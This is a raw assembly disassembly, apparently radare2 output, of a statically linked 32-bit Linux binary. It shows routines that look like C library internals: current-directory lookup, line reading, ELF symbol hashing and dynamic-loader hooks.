mov esi, dword [0x80aa34c]
jmp 0x80517a8
test edx, edx
je 0x8051759
mov esi, edx
mov eax, edi
xor edx, edx
div esi
cmp eax, ecx
je 0x8051759
call fcn.08048b20
mov dword [eax], 0xc
xor eax, eax
jmp 0x8051785
push ebp
xor eax, eax
mov ebp, esp
push ebx
mov ecx, dword [arg_8h]
mov ebx, dword [arg_ch]
cmp word [ecx], 0
sets al
inc eax
test ebx, ebx
je 0x8076c24
mov edx, dword [ecx]
and dh, 0x7f
cmp ebx, 2
mov dword [ecx], edx
je 0x8076c29
mov ebx, dword [esp]
leave
ret
or dh, 0x80
mov dword [ecx], edx
jmp 0x8076c24
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x2c
mov edi, dword [arg_8h]
mov dword [var_20h], 0
test edi, edi
je 0x807566e
mov esi, dword [arg_ch]
test esi, esi
je 0x807566e
mov eax, dword [arg_14h]
mov dword [var_24h], 0
movzx edx, word [eax]
test dx, dx
js 0x80754d8
mov eax, 0
test eax, eax
je 0x80754d8
mov edx, dword [arg_14h]
lea eax, [var_1ch]
mov dword [var_24h], 1
mov dword [esp], eax
mov dword [var_4h], fcn.08074580
mov dword [var_8h], edx
call section.
mov eax, dword [arg_14h]
movzx edx, word [eax]
test dx, dx
jns 0x807565e
mov eax, dword [arg_14h]
test byte [eax], 0x20
jne 0x8075657
mov edx, dword [arg_8h]
mov ebx, dword [edx]
test ebx, ebx
je 0x80754ff
mov eax, dword [arg_ch]
mov ecx, dword [eax]
test ecx, ecx
jne 0x8075526
mov edx, dword [arg_ch]
mov esi, 0xffffffff
mov dword [edx], 0x78
mov dword [esp], 0x78
call fcn.08050fe0
mov edx, dword [arg_8h]
test eax, eax
mov dword [edx], eax
je 0x8075603
mov eax, dword [arg_14h]
mov edi, dword [eax + 8]
mov esi, dword [eax + 4]
sub edi, esi
test edi, edi
jle 0x807563c
lea esi, [esi]
mov eax, dword [arg_10h]
mov edx, dword [arg_14h]
mov dword [var_8h], edi
mov dword [var_4h], eax
mov eax, dword [edx + 4]
mov dword [esp], eax
call fcn.08077220
test eax, eax
mov dword [var_28h], eax
je 0x8075565
sub eax, esi
lea edi, [eax + 1]
mov eax, dword [var_20h]
mov edx, dword [arg_ch]
add eax, edi
mov ebx, eax
mov dword [var_2ch], eax
mov eax, dword [edx]
inc ebx
cmp ebx, eax
jbe 0x80755aa
add eax, eax
mov edx, dword [arg_8h]
mov esi, 0xffffffff
cmp ebx, eax
cmovb ebx, eax
mov dword [var_4h], ebx
mov eax, dword [edx]
mov dword [esp], eax
call fcn.08051220
test eax, eax
je 0x8075603
mov edx, dword [arg_8h]
mov dword [edx], eax
mov edx, dword [arg_14h]
mov eax, dword [arg_ch]
mov esi, dword [edx + 4]
mov dword [eax], ebx
mov eax, dword [arg_8h]
mov eax, dword [eax]
mov dword [var_4h], esi
mov dword [var_8h], edi
add dword [var_20h], eax
mov edx, dword [var_20h]
mov dword [esp], edx
call fcn.08053770
mov edx, dword [var_2ch]
mov eax, dword [arg_14h]
mov dword [var_20h], edx
mov edx, dword [var_28h]
add dword [eax + 4], edi
test edx, edx
jne 0x80755f5
mov dword [esp], eax
call fcn.0804d9e0
inc eax
je 0x80755f5
mov eax, dword [arg_14h]
mov edi, dword [eax + 8]
mov eax, dword [eax + 4]
mov esi, eax
sub edi, esi
jmp 0x8075540
mov edx, dword [arg_8h]
mov eax, dword [edx]
mov edx, dword [var_2ch]
mov byte [edx + eax], 0
mov esi, edx
mov eax, dword [arg_14h]
cmp word [eax], 0
jns 0x8075632
mov eax, dword [var_24h]
test eax, eax
jne 0x807561d
mov eax, esi
add esp, 0x2c
pop ebx
pop esi
pop edi
leave
ret
lea eax, [var_1ch]
mov dword [var_4h], 0
mov dword [esp], eax
call section.
jmp 0x8075613
mov dword [esp], eax
call fcn.08074580
jmp 0x807560c
mov dword [esp], eax
mov esi, 0xffffffff
call fcn.0804d9e0
inc eax
je 0x8075603
mov edx, dword [arg_14h]
mov edi, dword [edx + 8]
mov esi, dword [edx + 4]
jmp 0x80755ee
mov esi, 0xffffffff
jmp 0x8075603
mov edx, dword [arg_14h]
mov dword [esp], edx
call fcn.08074540
jmp 0x80754e1
call fcn.08048b20
mov dword [eax], 0x16
mov eax, 0xffffffff
jmp 0x8075615
push ebp
mov ebp, esp
push edi
push esi
push ebx
mov ebx, eax
sub esp, 0x3c
mov dword [var_20h], ecx
mov dword [var_1ch], edx
movzx ecx, byte [eax]
mov edx, dword [0x80a99f4]
mov esi, edx
movsx eax, cl
test byte [edx + eax*2 + 1], 0x20
je 0x8057484
inc ebx
movzx ecx, byte [ebx]
movsx eax, cl
test byte [esi + eax*2 + 1], 0x20
jne 0x8057476
test cl, cl
mov dword [var_24h], ebx
je 0x8057690
movsx edx, cl
test byte [esi + edx*2 + 1], 0x20
jne 0x80574c5
lea esi, [esi]
mov eax, dword [0x80a99fc]
mov eax, dword [eax + edx*4]
mov byte [ebx], al
inc ebx
movzx ecx, byte [ebx]
test cl, cl
je 0x8057690
mov eax, dword [0x80a99f4]
movsx edx, cl
test byte [eax + edx*2 + 1], 0x20
je 0x80574a0
test cl, cl
je 0x8057690
mov byte [ebx], 0
mov edx, dword [0x80a99f4]
inc ebx
mov dword [var_38h], ebx
mov dword [var_28h], ebx
movzx ecx, byte [ebx]
movsx eax, cl
test byte [edx + eax*2 + 1], 0x20
je 0x80574fe
lea esi, [esi]
inc ebx
movzx ecx, byte [ebx]
movsx eax, cl
test byte [edx + eax*2 + 1], 0x20
jne 0x80574f0
test cl, cl
je 0x8057690
movsx eax, cl
test byte [edx + eax*2 + 1], 0x20
jne 0x8057540
mov esi, eax
mov edx, dword [0x80a99fc]
mov eax, dword [var_38h]
inc ebx
inc dword [var_38h]
mov edx, dword [edx + esi*4]
mov byte [eax], dl
movzx ecx, byte [ebx]
test cl, cl
je 0x8057690
movsx eax, cl
mov esi, eax
mov eax, dword [0x80a99f4]
test byte [eax + esi*2 + 1], 0x20
je 0x8057512
test cl, cl
je 0x8057690
mov eax, dword [var_38h]
mov byte [eax], 0
mov edx, dword [0x80a99f4]
inc eax
mov dword [var_38h], eax
inc ebx
movzx ecx, byte [ebx]
movsx eax, cl
test byte [edx + eax*2 + 1], 0x20
jne 0x8057558
mov edx, dword [var_38h]
test cl, cl
mov esi, ecx
mov dword [var_2ch], edx
je 0x805776b
mov edx, dword [var_38h]
mov eax, esi
inc ebx
mov byte [edx], al
inc edx
mov dword [var_38h], edx
movzx ecx, byte [ebx]
test cl, cl
mov esi, ecx
je 0x805776b
mov eax, dword [0x80a99f4]
movsx edx, cl
test byte [eax + edx*2 + 1], 0x20
je 0x8057576
test cl, cl
je 0x805776b
mov eax, dword [var_38h]
mov byte [eax], 0
mov dword [esp], ebx
mov dword [var_8h], 0xa
inc eax
mov dword [var_sp_ch], 0
mov dword [var_38h], eax
lea eax, [var_10h]
mov dword [var_4h], eax
call fcn.080494c0
cmp ebx, dword [var_10h]
mov dword [var_34h], eax
je 0x805775f
test eax, eax
jle 0x805775f
mov edx, dword [var_2ch]
movzx eax, byte [edx]
test al, al
je 0x8057690
cmp al, 0x2f
mov dword [var_30h], 0
mov eax, 0
cmovne eax, dword [var_20h]
mov dword [var_20h], eax
mov eax, dword [var_38h]
sub eax, edx
cmp eax, 3
jle 0x8057627
mov esi, dword [var_38h]
mov eax, 0x8093486
mov ecx, 4
cld
mov edi, eax
sub esi, 4
repe cmpsb byte [esi], byte ptr es:[edi]
je 0x805762e
mov dword [var_30h], 3
mov esi, dword [var_28h]
mov eax, dword [var_24h]
sub esi, dword [var_24h]
mov dword [esp], eax
mov dword [var_4h], esi
call fcn.08076f30
lea edx, [eax + 0x13]
and edx, 0xfffffffc
sub esp, edx
lea edx, [var_1fh]
and edx, 0xfffffff0
mov byte [eax + edx], 0
mov dword [esp], edx
mov edi, dword [var_24h]
mov dword [var_8h], eax
mov dword [var_4h], edi
call fcn.08053770
mov dword [var_4h], 0x80aaca0
mov dword [var_18h], eax
mov dword [var_8h], fcn.08056520
lea eax, [var_18h]
mov dword [esp], eax
call fcn.0807a2c0
test eax, eax
je 0x805769a
nop
lea esi, [esi]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret 0xc
mov eax, dword [var_38h]
mov edx, dword [var_30h]
mov dword [esp], 1
sub eax, edi
add eax, dword [var_20h]
lea eax, [edx + eax + 0x20]
mov dword [var_4h], eax
call fcn.08051730
test eax, eax
mov ebx, eax
je 0x8057690
lea edx, [eax + 0x20]
mov dword [eax], edx
mov dword [esp], edx
mov dword [var_4h], edi
mov dword [var_8h], esi
call fcn.08053740
mov edi, dword [var_28h]
mov dword [ebx + 4], eax
mov edx, eax
mov eax, dword [var_2ch]
sub eax, dword [var_28h]
mov dword [esp], edx
mov dword [var_4h], edi
mov dword [var_8h], eax
call fcn.08053740
mov esi, dword [var_20h]
mov edx, eax
mov eax, dword [var_34h]
mov dword [ebx + 0x10], edx
test esi, esi
mov dword [ebx + 8], eax
mov eax, dword [arg_10h]
mov dword [ebx + 0xc], eax
jne 0x8057745
mov edi, dword [var_2ch]
mov dword [esp], edx
sub dword [var_38h], edi
mov eax, dword [var_38h]
mov dword [var_4h], edi
mov dword [var_8h], eax
call fcn.08053740
mov ecx, dword [var_30h]
mov edx, eax
test ecx, ecx
je 0x8057734
mov eax, dword [0x8093486]
mov dword [edx - 1], eax
mov edx, 1
mov eax, ebx
call fcn.08057370
jmp 0x8057690
mov edi, dword [var_20h]
mov eax, dword [var_1ch]
mov dword [esp], edx
mov dword [var_8h], edi
mov dword [var_4h], eax
call fcn.08053740
mov edx, eax
jmp 0x805770a
mov dword [var_34h], 1
jmp 0x80575e3
mov edi, dword [var_38h]
mov byte [edi], 0
inc edi
mov dword [var_38h], edi
jmp 0x805775f
mov eax, dword [arg_4h]
mov ecx, dword [arg_8h]
sub ecx, eax
sub eax, 4
add eax, 4
mov dl, byte [eax + ecx]
mov byte [eax], dl
test dl, dl
je 0x8077400
mov dl, byte [eax + ecx + 1]
mov byte [eax + 1], dl
test dl, dl
je 0x80773ff
mov dl, byte [eax + ecx + 2]
mov byte [eax + 2], dl
test dl, dl
je 0x80773fe
mov dl, byte [eax + ecx + 3]
mov byte [eax + 3], dl
test dl, dl
jne 0x80773d0
inc eax
inc eax
inc eax
ret
push ebp
mov ebp, esp
sub esp, 0x24
mov eax, dword [arg_ch]
mov dword [var_8h], esi
mov dword [var_ch], ebx
mov dword [var_4h], edi
mov esi, dword [arg_8h]
mov dword [var_10h], eax
mov eax, dword [0x80aa9d4]
test eax, eax
je 0x807972f
mov ecx, dword [0x80aa9d8]
test ecx, ecx
je 0x8079914
mov edi, dword [var_10h]
test edi, edi
jne 0x8079743
test esi, esi
mov edi, 0x1000
jne 0x8079904
test esi, esi
mov dword [var_14h], esi
je 0x80798e2
test eax, eax
jne 0x80797ca
mov ebx, dword [var_14h]
mov ecx, edi
mov eax, 0xb7
int 0x80
cmp eax, 0xfffff000
mov dword [var_18h], eax
ja 0x80798c9
mov eax, dword [var_18h]
test eax, eax
js 0x80797a9
test esi, esi
je 0x8079784
mov eax, esi
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov ebx, dword [var_10h]
test ebx, ebx
je 0x8079793
test esi, esi
cmove esi, dword [var_14h]
jmp 0x8079777
mov ecx, dword [var_18h]
mov dword [var_sp_4h], ecx
mov ebx, dword [var_14h]
mov dword [esp], ebx
call fcn.08051220
mov esi, eax
jmp 0x807978b
call fcn.08048b20
mov eax, dword [eax]
cmp eax, 0x26
je 0x80798b0
cmp eax, 0x22
jne 0x80798a0
test esi, esi
je 0x80797ca
xor eax, eax
jmp 0x8079779
lea ebx, [edi - 1]
mov dword [var_sp_8h], ebx
mov edx, dword [var_14h]
mov dword [esp], 0x80a3480
mov dword [var_sp_4h], edx
call fcn.08079f10
cmp eax, 0xffffffff
je 0x80797fb
mov ecx, dword [var_14h]
cmp byte [ecx], 0x2f
je 0x8079863
mov dword [0x80aa9d8], 0
call fcn.08048b20
mov edx, dword [eax]
cmp edx, 0xd
je 0x8079818
xor eax, eax
cmp edx, 0x24
cmove eax, dword [0x80aa9d8]
mov dword [0x80aa9d8], eax
mov edx, dword [var_10h]
test edx, edx
je 0x807984f
mov edx, dword [var_10h]
mov eax, dword [var_14h]
call 0x8079930
test eax, eax
mov ebx, eax
je 0x8079837
mov eax, ebx
jmp 0x8079779
test esi, esi
jne 0x8079830
mov eax, dword [var_10h]
test eax, eax
je 0x8079830
mov edx, dword [var_14h]
mov dword [esp], edx
call fcn.08051180
jmp 0x8079830
mov eax, dword [var_14h]
mov dword [esp], eax
call fcn.08051180
mov dword [var_14h], 0
jmp 0x807981f
cmp eax, ebx
jae 0x807988b
mov ebx, dword [var_14h]
test esi, esi
mov byte [eax + ebx], 0
jne 0x8079777
mov ecx, dword [var_10h]
test ecx, ecx
jne 0x807978b
inc eax
mov dword [var_sp_4h], eax
jmp 0x807979d
test esi, esi
jne 0x80797c6
mov dword [esp], ecx
call fcn.08051180
jmp 0x80797c6
test esi, esi
jne 0x80797c6
mov eax, dword [var_14h]
mov dword [esp], eax
jmp 0x8079896
mov dword [0x80aa9d4], 1
mov dword [0x80aa9d8], 1
jmp 0x80797ca
call fcn.08048b20
neg dword [var_18h]
mov edx, dword [var_18h]
mov dword [var_18h], 0xffffffff
mov dword [eax], edx
jmp 0x807976c
mov dword [esp], edi
call fcn.08050fe0
mov dword [var_14h], eax
mov edx, dword [var_14h]
xor eax, eax
test edx, edx
je 0x8079779
mov eax, dword [0x80aa9d4]
jmp 0x807974e
call fcn.08048b20
mov dword [eax], 0x16
jmp 0x80797c6
mov edx, dword [var_10h]
mov eax, esi
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
jmp 0x8079930
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc8
mov dword [var_80h], 0xe0
mov dword [var_7ch], str..._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._..
mov dword [var_74h], edx
mov dword [var_70h], eax
mov dword [var_78h], str._proc
call fcn.08048b20
mov ecx, dword [var_74h]
mov edx, dword [eax]
test ecx, ecx
mov dword [var_a8h], ecx
mov dword [var_a4h], edx
jne 0x8079986
mov edx, dword [var_70h_2]
mov dword [var_a8h_2], 0x1001
test edx, edx
jne 0x8079ecb
mov esi, dword [var_70h]
test esi, esi
mov dword [var_9ch], esi
je 0x8079ea2
mov edx, dword [var_9ch]
lea ecx, [var_6ch]
add edx, dword [var_a8h]
mov ebx, edx
dec edx
mov dword [var_a0h], edx
mov byte [edx], 0
mov dword [esp], 3
mov dword [esp + 8], ecx
mov dword [esp + 4], 0x80a348f
call fcn.08090000
test eax, eax
js 0x8079d90
mov edx, dword [var_68h]
mov eax, dword [var_6ch]
lea ecx, [var_6ch]
mov dword [var_8ch], edx
mov dword [var_90h], eax
mov edx, dword [var_60h]
mov dword [var_98h], edx
mov dword [esp], 3
mov dword [esp + 4], 0x80a7290
mov dword [esp + 8], ecx
call fcn.08090000
test eax, eax
js 0x8079d90
mov edx, dword [var_68h]
mov eax, dword [var_6ch]
mov dword [var_84h], edx
mov dword [var_88h], eax
mov edx, dword [var_60h]
mov eax, dword [var_90h]
xor eax, dword [var_88h]
mov dword [var_94h], edx
mov edx, dword [var_8ch]
xor edx, dword [var_84h]
or edx, eax
je 0x8079e8b
mov esi, dword [var_7ch]
cmp dword [var_78h], esi
je 0x8079e05
sub dword [var_78h], 3
lea esi, [var_6ch]
mov dword [esp + 8], esi
mov eax, dword [var_78h]
mov dword [esp], 3
mov dword [esp + 4], eax
call fcn.08090000
test eax, eax
js 0x8079d7c
mov edx, dword [var_6ch]
mov ecx, dword [var_68h]
mov esi, dword [var_78h]
mov dword [var_b4h], edx
mov dword [var_b0h], ecx
mov eax, dword [var_b4h]
mov edx, dword [var_b0h]
xor eax, dword [var_90h]
xor edx, dword [var_8ch]
mov ecx, dword [var_60h]
mov dword [var_b8h], ecx
or eax, edx
setne byte [var_b9h]
mov dword [esp], esi
call fcn.0808f9c0
test eax, eax
mov dword [var_ach], eax
je 0x8079d7c
call fcn.08048b20
mov edi, dword [var_7ch]
add edi, dword [var_80h]
mov dword [eax], 0
sub edi, esi
mov edx, dword [var_ach]
mov dword [esp], edx
call fcn.0808fc00
test eax, eax
mov esi, eax
je 0x8079dc6
cmp byte [esi + 0xb], 0x2e
je 0x8079deb
cmp byte [var_b9h], 0
jne 0x8079b1a
mov eax, dword [var_98h_2]
cmp dword [esi], eax
jne 0x8079ae5
movzx eax, word [esi + 8]
mov dword [var_c0h], esp
lea eax, [eax + edi + 8]
and eax, 0xfffffffc
sub esp, eax
mov dword [esp + 8], edi
lea ebx, [var_b9h]
mov edx, dword [var_78h_2]
and ebx, 0xfffffff0
mov dword [esp], ebx
mov dword [esp + 4], edx
call fcn.08053740
lea edx, [esi + 0xb]
mov byte [eax], 0x2f
mov dword [esp + 4], edx
inc eax
mov dword [esp], eax
call fcn.0808dc90
mov dword [esp], 3
mov dword [esp + 4], ebx
lea ecx, [var_6ch_2]
mov dword [esp + 8], ecx
call fcn.08090000
test eax, eax
js 0x8079b98
mov eax, dword [var_6ch_2]
mov edx, dword [var_68h_2]
mov ecx, dword [var_8ch_2]
xor eax, dword [var_90h_2]
xor ecx, edx
or ecx, eax
jne 0x8079b98
mov eax, dword [var_98h_2]
cmp dword [var_60h_2], eax
je 0x8079ba3
mov esp, dword [var_c0h_2]
jmp 0x8079ae5
test esi, esi
mov esp, dword [var_c0h_2]
je 0x8079dc6
add esi, 0xb
mov dword [var_c4h], esi
mov dword [esp], esi
call fcn.08053400
mov esi, dword [var_a0h_2]
sub esi, dword [var_9ch_2]
mov edi, eax
cmp esi, eax
mov dword [var_c8h], esi
ja 0x8079c54
mov esi, dword [var_74h_2]
test esi, esi
jne 0x8079dab
mov esi, dword [var_a8h_2]
cmp eax, esi
mov eax, esi
cmovae eax, edi
add eax, eax
mov dword [var_a8h_2], eax
mov dword [esp + 4], eax
mov eax, dword [var_9ch_2]
mov dword [esp], eax
call fcn.08051220
test eax, eax
mov ebx, eax
je 0x8079d63
mov eax, dword [var_9ch_2]
mov ecx, dword [var_a8h_2]
add eax, esi
lea edx, [ecx + ebx]
mov esi, dword [var_c8h]
sub eax, dword [var_a0h_2]
lea ecx, [esi + ebx]
mov dword [esp + 4], ecx
sub edx, eax
mov dword [esp + 8], eax
mov dword [esp], edx
call fcn.08053770
mov dword [var_9ch_2], ebx
mov dword [var_a0h_2], eax
sub dword [var_a0h_2], edi
mov dword [esp + 8], edi
mov eax, dword [var_c4h]
mov dword [esp + 4], eax
mov edx, dword [var_a0h_2]
mov dword [esp], edx
call fcn.08053770
dec dword [var_a0h_2]
mov ecx, dword [var_a0h_2]
mov byte [ecx], 0x2f
mov esi, dword [var_ach_2]
mov dword [esp], esi
call fcn.0808fb60
mov edx, dword [var_b0h_2]
mov eax, dword [var_b4h_2]
mov dword [var_8ch_2], edx
mov dword [var_90h_2], eax
mov edx, dword [var_b8h_2]
mov eax, dword [var_90h_2]
xor eax, dword [var_88h_2]
mov dword [var_98h_2], edx
mov edx, dword [var_8ch_2]
xor edx, dword [var_84h_2]
or edx, eax
jne 0x8079a4b
mov ecx, dword [var_94h_2]
cmp dword [var_b8h_2], ecx
jne 0x8079a4b
mov esi, dword [var_9ch_2]
mov eax, dword [var_a8h_2]
lea ebx, [eax + esi]
lea eax, [ebx - 1]
cmp dword [var_a0h_2], eax
je 0x8079d54
cmp dword [var_7ch_2], str..._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._..
je 0x8079d17
mov ecx, dword [var_7ch_2]
mov dword [esp], ecx
call fcn.08051180
sub ebx, dword [var_a0h_2]
mov dword [esp + 8], ebx
mov esi, dword [var_a0h_2]
mov dword [esp + 4], esi
mov eax, dword [var_9ch_2]
mov dword [esp], eax
call fcn.08053690
call fcn.08048b20
mov edx, dword [var_a4h_2]
mov dword [eax], edx
mov eax, dword [var_9ch_2]
lea esp, [var_ch_2]
pop ebx
pop esi
pop edi
leave
ret
lea edx, [ebx - 2]
mov dword [var_a0h_2], edx
mov byte [ebx - 2], 0x2f
jmp 0x8079d03
mov ecx, dword [var_ach_2]
mov dword [esp], ecx
call fcn.0808fb60
call fcn.08048b20
mov dword [eax], 0xc
cmp dword [var_7ch], str..._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._..
je 0x8079d90
mov eax, dword [var_7ch]
mov dword [esp], eax
call fcn.08051180
mov ebx, dword [var_70h]
test ebx, ebx
je 0x8079d9b
xor eax, eax
jmp 0x8079d4c
mov edx, dword [var_9ch]
mov dword [esp], edx
call fcn.08051180
jmp 0x8079d97
mov esi, dword [var_ach_2]
mov dword [esp], esi
call fcn.0808fb60
call fcn.08048b20
mov dword [eax], 0x22
jmp 0x8079d7c
call fcn.08048b20
mov ecx, dword [var_ach]
mov ebx, dword [eax]
mov esi, eax
mov dword [esp], ecx
call fcn.0808fb60
mov eax, 2
test ebx, ebx
cmove ebx, eax
mov dword [esi], ebx
jmp 0x8079d7c
cmp byte [esi + 0xc], 0
je 0x8079ae5
cmp word [esi + 0xc], 0x2e
jne 0x8079b07
jmp 0x8079ae5
cmp esi, str..._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._..
je 0x8079e56
mov esi, dword [var_80h_2]
lea eax, [esi + esi + 1]
mov dword [esp + 4], eax
mov eax, dword [var_7ch_2]
mov dword [esp], eax
call fcn.08051220
test eax, eax
mov ebx, eax
je 0x8079d7c
add esi, eax
mov dword [var_78h_2], esi
mov edx, dword [var_80h]
mov dword [esp + 4], ebx
mov dword [esp + 8], edx
mov ecx, dword [var_78h]
mov dword [esp], ecx
call fcn.08053740
mov byte [eax], 0
mov dword [var_7ch], ebx
shl dword [var_80h], 1
jmp 0x8079a57
mov edx, dword [var_80h]
lea eax, [edx + edx + 1]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x8079d7c
mov ecx, dword [var_80h]
mov dword [esp], eax
mov dword [esp + 4], 0x80a34a0
mov dword [esp + 8], ecx
call fcn.08053740
mov dword [var_78h], eax
jmp 0x8079e32
mov ecx, dword [var_94h]
cmp dword [var_98h], ecx
jne 0x8079a4b
jmp 0x8079cf8
mov eax, dword [var_a8h]
mov dword [esp], eax
call fcn.08050fe0
mov dword [var_9ch], eax
mov edi, dword [var_9ch]
xor eax, eax
test edi, edi
jne 0x8079997
jmp 0x8079d4c
mov dword [eax], 0x16
jmp 0x8079d97
push ebp
xor edx, edx
mov ebp, esp
push ebx
mov ebx, dword [arg_8h]
movzx eax, byte [ebx]
test al, al
je 0x8062be3
shl edx, 4
movzx eax, al
inc ebx
add edx, eax
mov ecx, edx
and ecx, 0xf0000000
je 0x8062bdc
mov eax, ecx
shr eax, 0x18
xor edx, eax
xor edx, ecx
movzx eax, byte [ebx]
test al, al
jne 0x8062bc0
pop ebx
mov eax, edx
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x28
mov edi, dword [0x80aa888]
mov dword [var_14h], edx
mov dword [var_10h], eax
movzx eax, word [edi + 4]
lea eax, [eax + edi]
mov dword [var_1ch], eax
movzx eax, word [edi + 6]
lea eax, [eax + edi]
mov dword [var_20h], eax
mov eax, dword [var_10h]
mov dword [esp], eax
call fcn.08062bb0
movzx esi, word [edi + 8]
mov dword [var_28h], eax
movzx edx, si
mov dword [var_2ch], edx
xor edx, edx
div dword [var_2ch]
mov eax, dword [var_28h]
mov ebx, edx
mov edx, dword [var_2ch]
sub edx, 2
mov ecx, edx
xor edx, edx
div ecx
movzx eax, word [edi + 4]
mov ecx, dword [var_20h]
inc edx
mov dword [var_18h], edx
mov edx, dword [0x80aa88c]
sub edx, eax
movzx eax, word [ecx + ebx*4]
mov dword [var_24h], edx
test ax, ax
je 0x805cc23
movzx eax, ax
cmp eax, dword [var_24h]
jae 0x805cc08
add eax, dword [var_1ch]
mov dword [var_4h], eax
mov eax, dword [var_10h]
mov dword [esp], eax
call fcn.08076e50
test eax, eax
je 0x805cc30
movzx esi, word [edi + 8]
add ebx, dword [var_18h]
movzx eax, si
mov edx, ebx
sub edx, eax
cmp ebx, eax
cmovae ebx, edx
mov edx, dword [var_20h]
movzx eax, word [edx + ebx*4]
test ax, ax
jne 0x805cbe6
mov eax, 0xffffffff
add esp, 0x28
pop ebx
pop esi
pop edi
leave
ret
mov edx, dword [var_20h]
mov ecx, dword [var_14h]
movzx eax, word [edx + ebx*4 + 2]
mov dword [ecx], eax
xor eax, eax
jmp 0x805cc28
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x20
mov dword [var_18h], ecx
mov dword [var_14h], edx
mov dword [var_1ch], esp
mov dword [var_10h], eax
mov dword [esp], eax
call fcn.08053400
mov edi, eax
mov eax, dword [var_14h_2]
mov dword [esp], eax
call fcn.08053400
mov dword [var_20h], 1
mov ebx, eax
inc ebx
lea eax, [ebx + edi + 0x12]
and eax, 0xfffffffc
sub esp, eax
mov dword [var_8h], edi
lea esi, [var_1bh]
mov edx, dword [var_10h]
and esi, 0xfffffff0
mov dword [esp], esi
mov dword [var_4h], edx
call fcn.08053740
mov dword [var_8h], ebx
mov ecx, dword [var_14h_2]
mov dword [esp], eax
mov dword [var_4h], ecx
call fcn.08053770
mov eax, esi
call fcn.0805d1a0
mov edx, eax
mov eax, dword [var_18h_2]
test edx, edx
mov dword [eax], edx
je 0x805cd07
mov ecx, dword [var_18h_2]
mov dword [eax + 4], 0
mov dword [var_20h], 0
mov eax, dword [edx + 0xc]
mov dword [ecx + 0x14], eax
mov eax, dword [var_18h_2]
mov ecx, dword [edx + 0x10]
mov dword [eax + 0x1c], ecx
test ecx, ecx
mov eax, dword [edx + 0x14]
mov edx, dword [var_18h_2]
mov dword [edx + 0x20], eax
mov dword [edx + 0x18], 0
mov dword [edx + 0x38], 0
jne 0x805cd15
mov eax, dword [var_20h]
mov esp, dword [var_1ch_2]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
mov dword [esp], ecx
call fcn.08083520
mov ecx, dword [var_18h_2]
mov dword [esp], ecx
call dword [ecx + 0x1c]
mov dword [var_20h], eax
jmp 0x805cd07
push ebp
mov ebp, esp
sub esp, 0x20
mov eax, dword [arg_8h]
lea edx, [var_10h]
mov dword [var_10h], eax
mov eax, dword [arg_ch]
mov dword [var_ch], eax
mov eax, 0x80835d0
call fcn.08083580
xor edx, edx
test eax, eax
jne 0x808373f
mov eax, dword [var_8h]
lea edx, [var_20h]
mov dword [var_1ch], str._dl_open_hook
mov dword [var_20h], eax
mov eax, fcn.08083660
call fcn.08083580
test eax, eax
jne 0x808373c
mov edx, dword [var_18h]
test edx, edx
je 0x8083743
mov eax, dword [var_14h]
mov eax, dword [eax + 4]
add eax, dword [edx]
test eax, eax
je 0x808373c
mov dword [eax], 0x80a9c14
mov edx, dword [var_8h]
mov eax, edx
leave
ret
mov eax, dword [var_14h]
mov eax, dword [eax + 4]
jmp 0x8083732
push ebp
mov ebp, esp
sub esp, 0x10
mov eax, dword [arg_8h]
lea edx, [var_10h]
mov dword [var_10h], eax
mov eax, dword [arg_ch]
mov dword [var_ch], eax
mov eax, fcn.080835f0
call fcn.08083580
xor edx, edx
test eax, eax
jne 0x8083784
mov ecx, dword [var_8h]
test ecx, ecx
je 0x8083788
mov eax, dword [var_4h]
mov edx, dword [eax + 4]
add edx, dword [ecx]
mov eax, edx
leave
ret
mov eax, dword [var_4h]
mov edx, dword [eax + 4]
jmp 0x8083784
push ebp
mov ecx, eax
mov ebp, esp
sub esp, 0x10
mov dword [esp], edx
lea eax, [var_ch]
mov dword [var_4h], ebx
lea edx, [var_8h]
mov dword [var_8h], 0
xor ebx, ebx
call fcn.08081410
mov edx, dword [var_8h]
sub esp, 4
test edx, edx
setne bl
test ebx, ebx
je 0x80835c1
cmp edx, str.out_of_memory
je 0x80835c1
mov dword [esp], edx
call fcn.08051180
mov eax, ebx
mov ebx, dword [var_4h]
leave
ret
push ebp
mov eax, fcn.08083650
mov ebp, esp
mov edx, dword [arg_8h]
leave
jmp fcn.08083580
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x58
mov ebx, dword [arg_8h]
mov dword [var_2ch], ecx
mov dword [var_24h], eax
mov dword [var_28h], edx
mov eax, dword [ebx]
cmp byte [eax], 0
je 0x805df80
test eax, eax
je 0x805df74
cmp byte [eax], 0
je 0x805df74
mov edx, dword [0x80a95f4]
test edx, edx
jne 0x805df5c
mov dword [var_4h], 0x80a0139
mov eax, dword [ebx]
mov dword [esp], eax
call fcn.08076e50
test eax, eax
je 0x805df47
mov dword [var_4h], str.POSIX
